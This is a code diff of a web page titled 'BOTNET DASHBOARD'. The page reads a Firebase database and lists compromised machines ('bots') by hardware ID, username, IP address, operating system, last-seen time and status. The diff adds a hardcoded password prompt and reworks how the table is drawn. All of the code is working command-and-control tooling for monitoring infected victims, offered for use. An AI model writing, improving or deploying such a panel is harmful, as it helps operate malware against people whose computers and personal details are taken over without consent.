@@ -12,10 +12,19 @@
   </style>
 </head>
 <body>
-  <h1>BOTNET DASHBOARD <span id="count">0</span> LIVE</h1>
-  <table id="table"><tr><th>HWID</th><th>User</th><th>IP</th><th>OS</th><th>Last Seen</th><th>Status</th></tr></table>
+  <h1>BOTNET DASHBOARD</h1>
 
   <script>
+    // ==================== CHANGE PASSWORD HERE ====================
+    const PASSWORD = "underground2026";   // ←←← CHANGE THIS TO WHATEVER YOU WANT
+    // ============================================================
+
+    let pass = prompt("Enter dashboard password:");
+    if (pass !== PASSWORD) {
+      alert("Wrong password - access denied");
+      location.href = "https://github.com";
+    }
+
     const firebaseConfig = {
       databaseURL: "https://mynet-b06ed-default-rtdb.firebaseio.com"
     };
@@ -24,16 +33,15 @@
 
     db.on('value', (snapshot) => {
       const data = snapshot.val();
-      const tbody = document.getElementById('table');
-      tbody.innerHTML = `<tr><th>HWID</th><th>User</th><th>IP</th><th>OS</th><th>Last Seen</th><th>Status</th></tr>`;
+      let html = `<table><tr><th>HWID</th><th>User</th><th>IP</th><th>OS</th><th>Last Seen</th><th>Status</th></tr>`;
       let count = 0;
       for (let key in data) {
         const bot = data[key];
-        const row = `<tr><td>${key}</td><td>${bot.username}</td><td>${bot.ip}</td><td>${bot.os}</td><td>${new Date(bot.timestamp).toLocaleString()}</td><td class="live">${bot.status}</td></tr>`;
-        tbody.innerHTML += row;
+        html += `<tr><td>${key}</td><td>${bot.username || ''}</td><td>${bot.ip || ''}</td><td>${bot.os || ''}</td><td>${bot.timestamp ? new Date(bot.timestamp).toLocaleString() : ''}</td><td class="live">${bot.status || ''}</td></tr>`;
         count++;
       }
-      document.getElementById('count').textContent = count;
+      html += `</table><br><h2>${count} LIVE BOTS</h2>`;
+      document.body.innerHTML += html;
     });
   </script>
 </body>
